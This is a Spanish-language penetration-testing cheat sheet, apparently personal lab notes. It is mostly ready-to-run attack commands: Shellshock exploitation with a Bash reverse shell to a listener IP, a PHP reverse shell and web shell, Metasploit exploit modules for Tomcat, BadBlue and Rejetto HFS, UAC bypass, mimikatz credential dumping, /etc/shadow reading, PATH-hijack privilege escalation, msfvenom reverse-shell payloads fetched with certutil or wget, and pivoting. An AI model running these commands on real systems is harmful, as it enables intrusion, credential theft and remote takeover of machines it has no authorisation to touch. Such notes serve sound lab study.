+		-  *APACHE + CGI* → apache http 2.4 → buscar *.cgi* → shellsock 
+			- *MSF*
+				- *COMPROBAR VULN* → `use auxiliary/scanner/http/apache_mod_cgi_bash_env set RHOSTS IP set TARGETURI /gettime.cgi run`
+				- *EXPLOIT* → `use exploit/multi/http/apache_mod_cgi_bash_env_exec set RHOSTS IP set TARGETURI /gettime.cgi set PAYLOAD cmd/unix/reverse_bash set LHOST TU_IP set LPORT 443 run`
+			- *MANUAL*
+				-  *BRUTE FORCE* → `wfuzz -c -hc=404 -t 200 -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt -z list,sh-pl-cgi http://ip/cgi-bin/FUZZ.FUZ2Z
+				- *DETECTAR CGI* → `nmap -sV IP --script http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"`
+				- *BURPSUITE* → Interceptar recarga del *.cgi* → injectar en *User-Agent*: `() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'`
+				- *REVERSE SHELL* → `nc -nvlp 443` → `() { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.16.38/443 0>&1'`
+				- *CARPETAS COMUNES* → `/cgi-bin/`-`/cgi/`-`/scripts/`-`/cgi-scripts/`-`/cgi-local/`-`/cgi-bin/scripts/`-`/bin/`-`/scripts/cgi-bin/`
+		- *APACHE + PHP 5.2.4* 
+			- *ENUMERACION* → `nikto -h http://ip_target
+			- *BUSQUEDA DE EXPLOITS* → `searchsploit php cgi` o `searchsploit php 5.2.4
+			- *REVERSE SHELL* → `$sock=fsockopen("<IP_ATACANTE>",443); exec("/bin/bash -i <&4 >&4 2>&4");` Ajustar los **descriptores de archivo** (`4`) si el exploit lo requiere.
+			- *EJECUCION* → `python2 exploit.py <IP_TARGET> 80` + `nc -nvlp 443`
+		- *APACHE TOMCAT* → **Apache Tomcat v8.5.19**
+			- *EXPLOIT* → `use exploit/multi/http/tomcat_jsp_upload_bypass` → Devuelve cmd no meterpreter `set PAYLOAD java/jsp_shell_bind_tcp set SHELL cmd` → Upgrade a meterpreter → [[WINDOWS EXPLOITATION]]
+		- *BADBLUE* → Si vemos *BadBlue/2.7*
+			- *EXPLOIT* → `use exploit/windows/http/badblue_passthru` → migrar a lsass.exe o explorer.exe
+		- *REJETTO HFS* → **Rejetto HFS 2.3**
+			- *EXPLOIT* → `use exploit/windows/http/rejetto_hfs_exec`→ Si el sistema es *x64* → `set PAYLOAD windows/x64/meterpreter/reverse_tcp
+	- **WEB** 
+		- *LEER MENSAJES DE ERROR*
+		- *whatweb / wappalyzer*
+		- *revisar código fuente*
+		- *ctrl + c*
+		- *robots.txt*
+		- *directorios con gobuster*
+		- *login → credenciales por defecto*
+		- *probar SQLi básica*
+		- *revisar uploads*
+			- *file upload* → subir un php malicioso → *revshells.com* → **PHP Pentest Monkey** o el tipico `<?php system($_GET['cmd']); ?>` → apuntar al fichero → click derecho *abrir imagen en una pestaña nueva* o *ctrl + c*.
+# POSTEXPLOTACION:
+[[ENUMERATION POST-EXPLOTACION]] → *ENUMERACION WINDOWS Y LINUX*
+[[ESCALATION]] → *ESCALADA WINDOWS Y LINUX*
+-  **BUSCAR PIVOTING** → puente para acceder o atacar otras máquinas/redes que desde tu equipo no son accesibles directamente.
+	- *VER INTERFACES RED* → `ip a` o `ifconfig` → Buscar *redes internas* o *ips* que antes no veias.
+	- *VER RUTAS* → `ip route` o `route -n`
+	- *VER MAQUINAS CONOCIDAS* → `arp -a` → Muestra *hosts internos*.
+	- *CONFIRMACION* → `ping -c 1 ip_interna` → Si responde confirmas *acceso lateral*.
+- ### MOVIMIENTO LATERAL:
+	- #### WINDOWS:
+		- *cd /var/www/html/loquesea/config.php* → puede contener creds
+		- *cd /var/www/html/loquesea/inicialize.php* → puede contener creds
+		- *buscar archivos .php* → `dir C:\*.php /s /b` o `dir C:\inetpub\*.php /s /b` o `dir /a /q`
+		- *reutilizacion de credenciales*
+	- #### LINUX:
+		- *cd /var/www/html/loquesea/config.php* → puede contener creds
+		- *cd /var/www/html/loquesea/inicialize.php* → puede contener creds
+		- *buscar archivos .php* → `find / -type f -name ".php" 2>/dev/null"` o `ls -la`
+		- *reutilizacion de credenciales*
+- ### ESCALATION:
+	- #### WINDOWS:
+	[[WINDOWS POSTEXPLOTATION]]
+	[[WINDOWS PRIVILEGE ESCALATION]]
+	- *getsystem* → Intenta escalada automatica en *METERPRETER*
+		- getsystem no funciona → *net localgroups Administrator* → `search bypassuac_injection` → localiza el módulo de bypass UAC por inyección (crea sesión elevada). → `set payload windows/x64/meterpreter/reverse_tcp` → `set TARGET Windows\ x64` → `getsystem`
+	- *SUGESTER* → `use post/multi/recon/local_exploit_suggester set SESSION ID`→ sugiere posibles exploits
+	- *getprivs* → ver nuestros privilegios
+	- *ps -faux* → muestra los procesos del sistema
+	- *netstat -tulnp* → Muestra sericios que estan escuchando en el sistema y los procesos que los usan, puertos internos abiertos.
+	- *DUMPEAR HASH* → [[WINDOWS CREDENTIALS DUMPING]]
+		- *ARCHIVOS CON CREDENCIALES* → `C:\Windows\Panther\Unattend.xml C:\Windows\Panther\Autounattend.xml` o `C:\Unattend.xml C:\Autounattend.xml C:\Windows\System32\Sysprep\`
+		- *MSF* → `load kiwi` → `creds_all` → `lsa_dump_sam` → `lsa_dump_secrets`
+		- *MANUAL* → `cd C:\ mkdir Temp cd Temp` → `upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe` → `shell .\mimikatz.exe` → `privilege::debug` → `privilege::debug` → `privilege::debug` → `privilege::debug`
+	- #### LINUX:
+	[[LINUX POSTEXPLOTATION]]
+	[[LINUX PRIVILEGE EXCALATION]]
+	- *whoami* → Ver que usuario somos
+	- *sudo -l* → Ver si podemos ejecutar algo como root
+	- *id* → Ver a que grupos pertenecemos
+	- *find / -perm -4000 -ls* → Buscar archivos con permisos *SUID*
+	- *find / -user* → Buscar archivos modificables por nuestro usuario
+		- Ver si podemos escribir el */etc/password* → cambiar la *X* por una contraseña de *openssl passwd*
+	- *getcaps -r /* → Listar capabilities
+	- *ps -faux* → muestra los procesos del sistema
+	- *netstat -tulnp* → Muestra sercicios que estan escuchando en el sistema y los procesos que los usan, puertos internos abiertos.
+	- *cat /etc/crontab* → Ver si hay *crons mal configuradas* (ver si podemos modificar alguna que se ejecute como root, si el archivo esta en un directorio escribible o si tiene permisos debiles)
+		- *PATH HIJACKING* → Si la cron se ejecuta sin ruta absoluta → `root backup.sh` → crear un `backup.sh` en un directorio que este antes en el *PATH*
+		- *DIRECTORIOS WORLD-WRITABLE* → Si el script tiene permisos *777* → podemos reemplazarlo completo
+	- *crontab -l* → Crons del usuario actual
+	- *ls -la /etc/cron.d*
+	- *strings script* → Buscar tipo `#!/bin/bash greetings` → *path hijacking a greetings* → `rm greetings cp /bin/bash greetings chmod +x greetings`
+		- Buscar herramientas que se llamen de forma relativa y *path hijacking* 
+			- modificando *PATH* → `export PATH=/tmp:$PATH` y en */tmp* → crear la herramienta → `cp /bin/bash -p > curl` + `chmod +x curl`
+	- *DIRTY COW* → EN EL ENLACE DE ARRIBA
+	- *DUMPEAR HASH*
+		- *MSF* → `use post/linux/gather/hashdump set SESSION <id> run`
+		- *MANUAL* → `cat /etc/shadow`
+			- *hashcat*
+			- *john*
+----
+# CUÁNDO MIGRAR
+- ### Payload está en un proceso temporal
+	- `cmd.exe`
+	- `powershell.exe`
+	- *proceso explotado que sabes que va a cerrarse*
+- ### Necesitas persistencia de sesión
+	- *enumerar tranquilo*
+	- *pivotar*
+	- *hacer post-explotación larga*
+- ### PROCESOS A LOS QUE MIGRAR
+	- 🟢 **explorer.exe**
+	- 🟡 **svchost.exe** (con cuidado)
+	- 🔴 **lsass.exe** (solo si eres SYSTEM)
+-----
+# PUERTOS CLAVE:
+- ### TCP.
+	- **21**   → `FTP (File Transfer Protocol)
+	- **22**   → `SSH (Acceso remoto Linux)
+	- **23**   → `Telnet (Acceso remoto inseguro)
+	- **25**   → `SMTP (Correo saliente / posible user enum)
+	- **53**   → `DNS (Transferencias de zona)
+	- **80**   → `HTTP (Web)
+	- **110**  → `POP3 (Correo)
+	- **111**  → `RPCBind (NFS enumeration)
+	- **135**  →`MSRPC (Windows RPC)
+	- **139**  → `NetBIOS (SMB antiguo)
+	- **143**  → `IMAP (Correo)
+	- **389**  → `LDAP (Active Directory enum)
+	- **443**  → `HTTPS (Web segura)
+	- **445**  → `SMB (Windows shares / null sessions / enum)
+	- **465**  → `SMTPS (SMTP sobre SSL)
+	- **500**  → `ISAKMP (VPN/IPSec)
+	- **587**  → `SMTP Submission (Correo autenticado)
+	- **636**  → `LDAPS (LDAP SSL)
+	- **989**  → `FTPS (FTP SSL)
+	- **990**  → `FTPS (FTP implícito SSL)
+	- **993**  → `IMAPS (Correo SSL)
+	- **995**  → `POP3S (Correo SSL)
+	- **1433** → `MSSQL (Base de datos Windows)
+	- **1521** → `Oracle DB
+	- **2049** → `NFS (Network File System)
+	- **2082** → `cPanel
+	- **2083** → `cPanel SSL
+	- **2181** → `Zookeeper (a veces en labs)
+	- **2222** → `SSH alternativo
+	- **2483** → `Oracle SSL
+	- **2484** → `Oracle SSL
+	- **3000** → `Web apps / Dev services
+	- **3128** → `Squid Proxy
+	- **3306** → `MySQL
+	- **3389** → `RDP (Escritorio remoto Windows)
+	- **3690** → `Subversion
+	- **4444** → `Metasploit handler / servicios custom
+	- **4567** → `Ruby services
+	- **4711** → `Custom services (a veces backdoors)
+	- **5000** → `Web apps Python / Flask
+	- **5432** → `PostgreSQL
+	- **5601** → `Kibana
+	- **5666** → `NRPE (Nagios)
+	- **5800** → `VNC Web
+	- **5900** → `VNC
+	- **5985** → `WinRM HTTP
+	- **5986** → `WinRM HTTPS
+	- **6379** → `Redis (MUY explotable si abierto)
+	- **6667** → `IRC
+	- **7001** → `WebLogic
+	- **8000** → `Web alternativo
+	- **8008** → `HTTP alt (Proxy / Tomcat)
+	- **8080** → `HTTP alt (MUY común)
+	- **8081** → `HTTP alt
+	- **8443** → `HTTPS alt
+	- **8888** → `Web / Jupyter / dev
+	- **9000** → `SonarQube / Web
+	- **9042** → `Cassandra
+	- **9090** → `Web panels
+	- **9200** → `Elasticsearch
+	- **27017** → `MongoDB
+- ### UDP
+	- **53**   → `DNS (Resolución / Zone Transfer)
+	- **67**   → `DHCP Server
+	- **68**   → `DHCP Client
+	- **69**   → `TFTP (Transferencias sin autenticación)
+	- **111**  → `RPCBind
+	- **123**  → `NTP (Info leak / version enum)
+	- **137**  → `NetBIOS Name Service
+	- **138**  → `NetBIOS Datagram
+	- **161**  → `SNMP (ENUMERACIÓN MUY IMPORTANTE)
+	- **162**  → `SNMP Trap
+	- **500**  → `ISAKMP (VPN/IPSec)
+	- **514**  → `Syslog
+	- **520**  → `RIP (Routing Information Protocol)
+	- **1434** → `MSSQL Browser
+	- **1900** → `UPnP
+	- **2049** → `NFS
+	- **4500** → `IPSec NAT-T
+	- **5353** → `mDNS
+---
+# CREACION DE PAYLOADS CON MSFVENOM
+- ### ¿Qué es msfvenom?
+	`msfvenom` es una utilidad de *línea de comandos* para:
+	- *Generar payloads*  
+	- *Codificarlos* (*encoding*)
+	- *Exportarlos en múltiples formatos*
+- ### Comandos útiles
+	- *PANEL AYUDA* → `msfvenom`
+	- *LISTAR PAYLOADS DISPONIBLES* → `msfvenom --list payloads`
+	- *FORMATOS DE SALIDA* → `msfvenom --list formats`
+- ### Payloads comunes
+	- #### Windows x86 → `msfvenom -a x86 -p windows/meterpreter/reverse_tcp \ LHOST=TU_IP LPORT=443 -f exe > payloadx86.exe`
+	- #### Windows x64 → `msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp \ LHOST=TU_IP LPORT=443 -f exe > payloadx64.exe`
+	- #### Linux x86 → `msfvenom -p linux/x86/meterpreter/reverse_tcp \ LHOST=TU_IP LPORT=443 -f elf > payloadx86`
+	- #### Linux x64 → `msfvenom -p linux/x64/meterpreter/reverse_tcp \ LHOST=TU_IP LPORT=443 -f elf > payloadx64`
+- ### Dar permisos y ejecutar:
+	- *DAR PERMISOS* → `chmod +x payloadx64` 
+	- *EJECUTAR* → `./payloadx64`
+-----
+# LISTENER EN METASPLOIT Y EN CONSOLA
+- ### Listener básico con Netcat
+	- `nc -nvlp 443`
+- ### Servidor para compartir el payload
+	- `sudo python3 -m http.server 80`
+- ### Handler con Metasploit (Meterpreter)
+	- `use multi/handler set PAYLOAD windows/x64/meterpreter/reverse_tcp`
+	- `set LHOST TU_IP`
+	- `set LPORT 443 run`
+- ### Descargar el payload desde la víctima
+	- **Navegador** → `http://NUESTRA_IP:80`
+	- **Windows** →`certutil -urlcache -f http://IP/payload.exe payload.exe`
+	- **Linux** →`wget http://IP/payload`
+----
+# PIVOTING
+[[PIVOTING && CLEARING YOUR TRACKS]] → *PIVOTING* y *PORT FORWARDING*
+*COMANDO PARA DETECTARLO* → `ip a` o `ifconfig`o `ss -natup`→ veremos varias interfaces red.
+### MANUAL
+- *ENUMERACION HOSTS* → ping sweep one liner. (lo ejecutamos desde la maquina vulnerada)
+	- *LINUX* → `for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done` (modificar ip si es necesario)
+	- *WINDOWS* → `for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.` (modificar ip si es necesario)
+### METERPRETER
+- `route` → lista las rutas añadidas
+- `route add 192.168.100.0/24 session_id` → crea una ruta con la session
+- `route del 192.168.100.0/24 session_id` → elimina una ruta
+*otra forma mas facil:*
+- `use multi/manage/autoroute` → `set SESSION id_session` → `run`
+- *ENUMERACION HOSTS*
+	- `nmap -sn 192.168.100.0/24` → quiza da muchos falsos positivos
+- *ENUMERACION PORTS*
+	- `use auxiliary/scanner/portscan/tcp | set RHOSTS 192.168.100.21` → run
+
+**TAMBIEN SE PUEDE HACER QUE MSF ACTUE DE PROXY Y USAR PROXYCHAINS**
+# PORT FORWARDING
+- ### METERPRETER:
+	- **portfwd add -l 8080 -p 80 -r 192.168.100.21** → veremos el puerto 80 de la maquina remota a traves de nuestro puerto 8080
+	- **portfwd add -l 2222 -p 22 -r 192.168.100.21** → `ssh root@localhost -p 2222
+- *SE VE TANTO DESDE LA MAQUINA NORMAL COMO DESDE METASPLOIT*
+	- *MAQUINA NORMAL* → Buscar en el buscador → localhost:80808
+		- o aplicar las herramientas al localhost
+	- *METERPRETER* → `set RHOSTS 192.168.100.21` → porque desde metasploit tenemos la route creada
